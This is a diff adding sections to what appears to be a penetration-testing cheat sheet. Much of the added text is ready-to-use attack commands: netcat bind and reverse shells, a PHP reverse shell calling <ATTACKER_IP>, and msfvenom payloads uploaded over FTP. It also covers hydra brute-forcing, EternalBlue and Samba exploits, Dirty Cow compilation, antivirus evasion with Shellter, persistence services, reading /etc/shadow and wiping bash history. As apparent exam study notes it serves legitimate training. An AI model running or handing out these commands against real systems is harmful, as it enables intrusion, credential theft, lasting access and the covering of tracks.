@@ -321,6 +321,7 @@ nmap -p 22 --script=ssh-brute --script-args userdb=<USERS_LIST> <TARGET_IP>
 
 ```bash
 # NETCAT
+nc <TARGET_IP> <TARGET_PORT>
 nc <TARGET_IP> 22
 ```
 
@@ -1860,43 +1861,467 @@ sudo armitage
 ### Vulnerability Scanning
 
 ```bash
-#
+# BANNER GRABBING
+nmap -sV -O <TARGET_IP>
+nmap -sV --script=banner <TARGET_IP>
+ls -al /usr/share/nmap/scripts | grep <KEYWORD>
+
+nc <TARGET_IP> <TARGET_OPEN_PORT>
 ```
 
 ### Exploits
 
 ```bash
-#
+# SEARCHSPLOIT - Install
+sudo apt update && sudo apt -y install exploitdb
+## Update
+searchsploit -u
+
+searchsploit [options] <term>
+
+# Copy an exploit to the current working dir
+searchsploit -m <EXPLOIT_ID>    
+# Case sensitive search
+searchsploit -c OpenSSH
+# Search just the exploit title
+searchsploit -t vsftpd
+# Exact search on title
+searchsploit -e "Windows 7"
+
+# Filters search
+searchsploit remote windows smb
+searchsploit remote linux ssh
+searchsploit remote linux ssh OpenSSH
+searchsploit remote webapps wordpress
+searchsploit local windows
+searchsploit local windows | grep -e "Microsoft"
+
+# List online links
+searchsploit -w remote windows smb | grep -e "EternalBlue"
+```
+
+```bash
+# CROSS COMPILING
+sudo apt -y install mingw-w64 gcc
+
+## Windows Target
+searchsploit VideolAN VLC SMB
+searchsploit -m 9303
+# Compile for x64
+x86_64-w64-mingw32-gcc 9303.c -o exploit64.exe
+# Compile for x86 (32-bit)
+i686-w64-mingw32-gcc 9303.c -o exploit32.exe
+
+## Linux Target
+searchsploit Dirty Cow
+searchsploit -m 40839
+gcc -pthread 40839.c -o dirty_exploit -lcrypt
 ```
 
 ### Shells
 
 ```bash
-#
+# NETCAT - Install
+sudo apt update && sudo apt install -y netcat
+# or upload the nc.exe on the target machine
+
+nc <TARGET_IP> <TARGET_PORT>
+nc -nv <TARGET_IP> <TARGET_PORT>
+nc -nvu <TARGET_IP> <TARGET_UDP_PORT>
+
+## NC Listener
+nc -nvlp <LOCAL_PORT>
+nc -nvlup <LOCAL_UDP_PORT>
+
+## Transfer files
+# Target machine
+nc.exe -nvlp <PORT> > test.txt
+# Attacker machine
+echo "Hello target" > test.txt
+nc -nv <TARGET_IP> <TARGET_PORT> < test.txt
+```
+
+```bash
+# BIND SHELL
+
+## Target Win machine - Bind shell listener with executable cmd.exe
+nc.exe -nvlp <PORT> -e cmd.exe
+## Attacker Linux machine
+nc -nv <TARGET_IP> <PORT>
+
+## Target Linux machine - Bind shell listener with /bin/bash
+nc -nvlp <PORT> -c /bin/bash
+## Attacker Win machine
+nc.exe -nv <TARGET_IP> <TARGET_PORT>
+```
+
+```bash
+# REVERSE SHELL
+
+## Attacker Linux machine
+nc -nvlp <PORT>
+## Target Win machine
+nc.exe -nv <ATTACKER_IP> <ATTACKER_PORT> -e cmd.exe
+
+## Attacker Linux machine
+nc -nvlp <PORT>
+## Target Linux machine
+nc -nv <ATTACKER_IP> <ATTACKER_PORT> -e /bin/bash
 ```
 
 ### Frameworks
 
 ```bash
-#
+# METASPLOIT - example
+service postgresql start && msfconsole -q
+db_status
+setg RHOSTS <TARGET_IP>
+setg RHOST <TARGET_IP>
+workspace -a <SERVICE_NAME>
+
+search <SERVICE_NAME>
+use exploit/multi/http/processmaker_exec
+options
+set USERNAME <USER>
+set PASSWORD <PW>
+run
+```
+
+```bash
+# POWERSHELL EMPIRE - Install
+sudo apt update && sudo apt install -y powershell-empire
+
+## Server run
+sudo powershell-empire server
+
+## Client run (another terminal session)
+sudo powershell-empire client
+listeners
+agents
+interact <ID>
+history
 ```
 
 ### Win Exploitation
 
 ```bash
-#
+# Attacker's machine - Find target IP
+cat /etc/hosts
+ping <TARGET_IP>
+ping <TARGET_FQDN>
+mkdir <TARGET>
+cd <TARGET>/
+
+# Port Scanning - 1000 common ports or more advanced scans
+nmap -sV <TARGET_IP>
+nmap -T4 -PA -sC -sV -p 1-10000 <TARGET_IP> -oX nmap_10k
+nmap -T4 -PA -sC -sV -p- <TARGET_IP> -oX nmap_all
+nmap -sU -sV <TARGET_IP> -oX nmap_udp
+
+# Banner Grabbing
+nc -nv <TARGET_IP> 21
+
+# Enumeration
+service postgresql start && msfconsole
+db_status
+setg RHOSTS <TARGET_IP>
+setg RHOST <TARGET_IP>
+workspace -a <SERVICE_NAME>
+db_import nmap_10k
+
+hosts
+services
+use auxiliary/scanner/smb/smb_version
+run
+hosts
+```
+
+#### IIS/FTP
+
+```bash
+# Targeting IIS/FTP
+nmap -sV -sC -p21,80 <TARGET_IP>
+## Try anonymous:anonymous
+ftp <TARGET_IP>
+
+## Brute-force FTP
+hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt <TARGET_IP> ftp
+
+hydra -l administrator -P /usr/share/wordlists/metasploit/unix_users.txt <TARGET_IP> ftp -I
+hydra -l <USER> -P /usr/share/wordlists/metasploit/unix_users.txt <TARGET_IP> ftp -I
+
+## Generate an .asp reverse shell payload
+cd <TARGET>/
+ip -br -c a
+msfvenom -p windows/shell/reverse_tcp LHOST=<LOCAL_IP> LPORT=<LOCAL_PORT> -f asp > shell.aspx
+
+## FTP Login with <USER>
+ftp <TARGET_IP>
+put shell.aspx
+
+## msfconsole
+use multi/handler
+set payload windows/shell/reverse_tcp
+set LHOST <LOCAL_IP>
+set LPORT <LOCAL_PORT>
+
+## Open http://<TARGET_IP>/shell.aspx . A reverse shell may be received.
+```
+
+#### OPENSSH
+
+```bash
+# Targeting OPENSSH
+nmap -sV -sC -p 22 <TARGET_IP>
+
+searchsploit OpenSSH 7.1
+
+## Brute-force SSH
+hydra -l administrator /usr/share/wordlists/metasploit/unix_users.txt <TARGET_IP> ssh
+hydra -l <USER> -P /usr/share/wordlists/metasploit/unix_users.txt <TARGET_IP> ssh
+
+## SSH Login with <USER>
+ssh <USER>@<TARGET_IP>
+
+## Win
+bash
+net localgroup administrators
+whoami /priv
+
+# msfconsole
+use auxiliary/scanner/ssh/ssh_login
+setg RHOST <TARGET_IP>
+setg RHOSTS <TARGET_IP>
+set USERNAME <USER>
+set PASSWORD <PW>
+run
+session 1
+# CTRL+Z to background
+sessions -u 1
+```
+
+#### SMB
+
+```bash
+# Targeting SMB
+nmap -sV -sC -p 445 <TARGET_IP>
+
+## Brute-force SMB
+hydra -l administrator -P /usr/share/wordlists/metasploit/unix_passwords.txt <TARGET_IP> smb
+hydra -l <USER> -P /usr/share/wordlists/metasploit/unix_passwords.txt <TARGET_IP> smb
+
+## Enumeration
+smbclient -L <TARGET_IP> -U <USER>
+smbmap -u <USER> -p <PW> -H <TARGET_IP>
+enum4linux -u <USER> -p <PW> -U <TARGET_IP>
+
+## msfconsole
+use auxiliary/scanner/smb/smb_enumusers
+set RHOSTS <TARGET_IP>
+set SMBUser <USER>
+set SMBPass <PW>
+run
+
+## SMB Login with <USER>
+locate psexec.py
+cp /usr/share/doc/python3-impacket/examples/psexec.py .
+chmod +x psexec.py
+python3 psexec.py Administrator@<TARGET_IP>
+python3 psexec.py <USER>@<TARGET_IP>
+
+# msfconsole - Meterpreter
+use exploit/windows/smb/psexec
+set RHOSTS <TARGET_IP>
+set SMBUser Administrator
+set SMBPass <PW>
+set payload windows/x64/meterpreter/reverse_tcp
+run
+
+# Without <USER>:<PW>, exploit a vulnerability, e.g. EternalBlue
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS <TARGET_IP>
+run
+```
+
+#### MYSQL
+
+```bash
+# Targeting MYSQL (Wordpress)
+nmap -sV -sC -p 3306,8585 <TARGET_IP>
+
+searchsploit MySQL 5.5
+
+## Brute-force MySql - msfconsole
+msfconsole -q
+use auxiliary/scanner/mysql/mysql_login
+set RHOSTS <TARGET_IP>
+set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
+run
+
+## MYSQL Login with <USER>
+mysql -u root -p -h <TARGET_IP>
+
+show databases;
+use <db>;
+show tables;
+select * from <table>;
+
+## msfconsole
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS <TARGET_IP>
+run
+
+sysinfo
+cd /
+cd wamp
+dir
+cd www\\wordpress
+cat wp-config.php
+shell
 ```
 
 ### Linux Exploitation
 
 ```bash
-#
+# Attacker's machine - Find target IP
+cat /etc/hosts
+ping <TARGET_IP>
+ping <TARGET_FQDN>
+mkdir <TARGET>
+cd <TARGET>/
+
+# Port Scanning - 1000 common ports or more advanced scans
+nmap -sV <TARGET_IP>
+nmap -sV -p 1-10000 <TARGET_IP> -oX nmap_10k
+nmap -T4 -PA -sC -sV -p 1-10000 <TARGET_IP> -oX nmap_10k
+nmap -T4 -PA -sC -sV -p- <TARGET_IP> -oX nmap_all
+nmap -sU -sV <TARGET_IP> -oX nmap_udp
+
+# Banner Grabbing - various ports e.g.
+nc -nv <TARGET_IP> 512
+nc -nv <TARGET_IP> 513
+nc -nv <TARGET_IP> 1524
+
+# Enumeration
+cat /etc/*release
+whoami
+```
+
+#### VSFTPD
+
+```bash
+# Targeting VSFTPD
+nmap -sV -sC -p 21 <TARGET_IP>
+
+## Try anonymous:anonymous
+ftp <TARGET_IP>
+
+## Exploit vsFTPd
+searchsploit vsftpd
+searchsploit -m 49757
+vim 49757.py
+chmod +x 49757.py
+python3 49757.py <TARGET_IP>
+
+## Enumerate SMTP - msfconsole
+use auxiliary/scanner/smtp/smtp_enum
+setg RHOSTS <TARGET_IP>
+set UNIXONLY true
+run
+
+## Brute-force FTP
+hydra -l <USER> -P /usr/share/metasploit-framework/data/wordlists/unix_users.txt <TARGET_IP> ftp
+
+## Modify the shell via FTP
+cp /usr/share/webshells/php/php-reverse-shell.php .
+mv php-reverse-shell.php shell.php
+vim shell.php
+## Change the $ip & $port variable to the Attacker's IP & port
+
+ftp <TARGET_IP>
+cd /
+cd /var/www/dav
+put shell.php
+
+## Attacker listener
+nc -nvlp <PORT>
+## Open http://<TARGET_IP>/dav/shell.php
+
+/bin/bash -i
+```
+
+```bash
+# Targeting PHP
+nmap -sV -sC -p 80 <TARGET_IP>
+
+## Browse
+http://<TARGET_IP>/phpinfo.php
+
+## Manual Exploitation PHP CGI
+searchsploit php cgi
+searchsploit -m 18836
+python2 18836.py <TARGET_IP> 80
+## If it executes, modify the .py script
+vim 18836.php
+## PHP Reverse Shell
+pwn_code = """<?php $sock=fsockopen("<ATTACKER_IP>",<PORT>);exec("/bin/sh -i <&4 >&4 2>&4");?>"""
+
+## Attacker listener in another tab
+nc -nvlp <PORT>
+## Launch the exploit
+python2 18836.py <TARGET_IP> 80
+```
+
+```bash
+# Targeting SAMBA
+nmap -sV -p 445 <TARGET_IP>
+
+nc -nv <TARGET_IP> 445
+
+searchsploit samba 3.0.20
+
+# msfconsole
+use auxiliary/scanner/smb/smb_version
+setg RHOSTS <TARGET_IP>
+run
+
+use exploit/multi/samba/usermap_script
+run
+background
+sessions -u 1
+sessions 2
+
+cat /etc/shadow
 ```
 
 ### Obfuscation
 
 ```bash
-#
+# SHELLTER - Install
+sudo apt update && sudo apt install -y shellter
+sudo dpkg --add-architecture i386 && sudo apt update && sudo apt -y install wine32
+rm -r ~/.wine
+
+cd /usr/share/windows-resources/shellter
+sudo shellter
+
+mkdir AVBypass
+cd AVBypass
+cp /usr/share/windows-binaries/vncviewer.exe .
+# Proceed in Sellter window
+```
+
+```bash
+# INVOKE-OBFUSCATION PowerShell script - Install
+cd /opt
+sudo git clone https://github.com/danielbohannon/Invoke-Obfuscation.git
+sudo apt update && sudo apt install -y powershell
+
+pwsh
+cd /opt/Invoke-Obfuscation/
+Import-Module ./Invoke-Obfuscation.psd1
+cd ..
+Invoke-Obfuscation
 ```
 
 ## [Post-Exploitation](hostnetwork-penetration-testing/5-post-exploit.md)
@@ -1904,31 +2329,214 @@ sudo armitage
 ### Win Local Enumeration
 
 ```bash
-#
+# MSF Meterpreter
+getuid
+sysinfo
+show_mount
+cat C:\\Windows\\System32\\eula.txt
+getprivs
+pgrep explorer.exe
+migrate <PROCESS_ID>
+
+# Win CMD - run 'shell' in Meterpreter
+hostname
+systeminfo
+wmic qfe get Caption,Description,HotFixID,InstalledOn
+
+whoami
+whoami /priv
+query user
+net users
+net user <USER>
+net localgroup
+net localgroup Administrators
+net localgroup "Remote Desktop Users"
+
+ipconfig
+ipconfig /all
+route print
+arp -a
+netstat -ano
+netsh firewall show state
+netsh advfirewall show allprofiles
+
+ps
+net start
+wmic service list brief
+tasklist /SVC
+schtasks /query /fo LIST
+schtasks /query /fo LIST /v
+
+# Metasploit
+use post/windows/gather/enum_logged_on_users
+use post/windows/gather/win_privs
+use post/windows/gather/enum_logged_on_users
+use post/windows/gather/checkvm
+use post/windows/gather/enum_applications
+use post/windows/gather/enum_computers
+use post/windows/gather/enum_patches
+use post/windows/gather/enum_shares
+
+# JAWS - Automatic Local Enumeration - Powershell
+powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename Jaws-Enum.txt
 ```
 
 ### Linux Local Enumeration
 
 ```bash
-#
+# MSF Meterpreter
+getuid
+sysinfo
+ifconfig
+netstat
+route
+arp
+ps
+pgrep vsftpd
+
+# Linux SHELL - run 'shell' in Meterpreter
+/bin/bash -i
+cd /root
+hostname
+cat /etc/*issue
+cat /etc/*release
+uname -a
+dpkg -l
+
+env
+lscpu
+free -h
+df -h
+lsblk | grep sd
+
+whoami
+ls -al /home
+cat /etc/passwd
+cat /etc/passwd | grep -v /nologin
+groups <USER>
+groups root
+groups
+who
+w
+last
+lastlog
+
+ifconfig
+ip -br -c a
+ip a
+cat /etc/networks
+cat /etc/hostname
+cat /etc/hosts
+cat /etc/resolv.conf
+arp -a
+
+ps
+ps aux
+ps aux | grep msfconsole
+ps aux | grep root
+top
+cat /etc/cron*
+crontab -l
+
+# Metasploit
+use post/linux/gather/enum_configs
+use post/linux/gather/enum_network
+use post/linux/gather/enum_system
+use post/linux/gather/checkvm
+
+# LINENUM
+cd /tmp
+upload LinEnum.sh
+shell
+/bin/bash -i
+chmod +x LinEnum.sh
+./LinEnum.sh
+
+./LinEnum.sh -s -k <keyword> -r <report> -e /tmp/ -t
 ```
 
 ### Transferring Files
 
 ```bash
-#
+# PYTHON WEB SERVER
+python -V
+python3 -V
+py -v # on Windows
+
+# Python 2.7
+python -m SimpleHTTPServer <PORT_NUMBER>
+
+# Python 3.7
+python3 -m http.server <PORT_NUMBER>
+
+# On Windows, try 
+python -m http.server <PORT>
+py -3 -m http.server <PORT>
+```
+
+```bash
+# TMUX Terminal Multiplexer
+sudo apt install tmux -y
 ```
 
 ### Shells
 
 ```bash
-#
+cat /etc/shells
+    # /etc/shells: valid login shells
+    /bin/sh
+    /bin/dash
+    /bin/bash
+    /bin/rbash
+
+/bin/bash -i
+
+/bin/sh -i
+```
+
+#### TTY Shells
+
+```bash
+# BASH
+/bin/bash -i
+/bin/sh -i
+SHELL=/bin/bash script -q /dev/null
+
+# Setup environment variables
+export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+export TERM=xterm
+export SHELL=/bin/bash
+```
+
+```bash
+# PYTHON
+python --version
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+## Fully Interactive TTY
+# Background (CTRL+Z) the current remote shell
+stty raw -echo && fg
+# Reinitialize the terminal with reset
+reset
+```
+
+```bash
+# PERL
+perl -h
+perl -e 'exec "/bin/bash";'
 ```
 
 ### Win Privilege Escalation
 
 ```bash
-#
+# PrivescCHECK - PowerShell script
+powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_%COMPUTERNAME% -Format TXT,CSV,HTML,XML"
+
+## Basic mode
+powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
+
+## Extended Mode + Export Txt Report
+powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_%COMPUTERNAME%"
 ```
 
 ### Linux Privilege Escalation
@@ -1940,7 +2548,16 @@ sudo armitage
 ### Win Persistence
 
 ```bash
-#
+# msfcosole - Admin Meterpreter
+search platform:windows persistence
+use exploit/windows/local/persistence_service
+set payload windows/meterpreter/reverse_tcp
+set LPORT <PORT>
+set SESSION 1
+run
+
+# Meterpreter - Enable RDP
+run getgui -e -u <NEWUSER> -p <PW>
 ```
 
 ### Linux Persistence
@@ -1961,10 +2578,27 @@ sudo armitage
 #
 ```
 
-### Clearing
+### Clearing Tracks
 
 ```bash
-#
+# Windows C:\Temp - Metasploit e.g.
+cd C:\\
+mkdir Temp
+cd Temp # Clean this C:\Temp directory
+
+## Cleanup Meterpreter RC File:
+cat /root/.msf4/logs/persistence/<CLEANING_SCRIPT>.rc
+background
+sessions 1
+resource /root/.msf4/logs/persistence/<CLEANING_SCRIPT>.rc
+run multi_console_command -r /root/.msf4/logs/scripts/getgui/<CLEANING_SCRIPT>.rc
+
+clearenv
+
+# Linux /tmp
+cd /tmp
+history -c
+cat /dev/null > ~/.bash_history
 ```
 
 ## [Social Engineering](hostnetwork-penetration-testing/6-social-engineer.md)
